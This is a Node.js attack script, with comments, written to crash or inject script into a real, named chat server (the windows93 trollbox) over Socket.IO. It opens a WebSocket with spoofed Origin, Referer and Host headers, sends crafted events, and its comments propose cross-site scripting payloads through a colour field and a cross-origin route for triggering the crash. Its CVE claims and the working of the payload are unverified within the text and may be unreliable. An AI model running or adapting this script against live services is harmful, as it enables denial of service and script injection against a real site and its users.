// DOS (Denial of Service) attack against a Socket.IO server
// CVE-2024-38355
// Socket.io server versions <= 4.5.0 are vulnerable to a DoS attack via malformed packets that cause the server to crash.
// This script connects to the server and sends a malformed packet to trigger the vulnerability.
// Even worse: The server's socket-io server version is 2.2.0, which is also vulnerable to this attack.
// Notice that, there's CVE-2020-28481, CORS. which allows any website to connect to the socket.io server and send messages, which can be used to trigger this DoS attack from any website.
/*const io = require("socket.io-client");

const socket = io("https://v2.windows93.net:8088", {
    path: "/socket.io",
    transports: ["polling"],
    forceNew: true,
    transportOptions: {
        polling: {
            extraHeaders: {
                Origin: "https://v2.windows93.net",
                Referer: "https://v2.windows93.net/trollbox/index.php",
                Host: "v2.windows93.net",
                "User-Agent": "Mozilla/5.0"
            }
        }
    }
});*/
/* Better: Websocket API, which is more low-level and can send truly malformed packets, while socket.io-client will try to format the packets correctly, which may not trigger the vulnerability. */
const WebSocket = require("ws");

const ws = new WebSocket("wss://v2.windows93.net:8088/socket.io/?EIO=3&transport=websocket", {
    headers: {
        Origin: "https://v2.windows93.net",
        Referer: "https://v2.windows93.net/trollbox/index.php",
        Host: "v2.windows93.net",
        "User-Agent": "Mozilla/5.0"
    }
});
function doEmit(event, ...args) {
    // Create flat array: [event, arg1, arg2, ...]
    const packet = `42${JSON.stringify([event, ...args])}`;
    ws.send(packet);
}
ws.on("open", () => {
    console.log("Connected!");
    // second argument is color, it probably has cross site scripting
    // our XSS payload can be something like: <img src=x onerror=alert(1)>, but for this DoS attack, we can just send a very long string to crash the server.
    // the server tries to sanitize the color, but we can do the better XSS payload that is unsanitzable:
    // #&xFFFE; onerror=alert(1) &#xFFFE;
    doEmit("user joined", "3", "#fff000", "", "");
});

ws.on("close", console.log)
ws.on("error", console.log)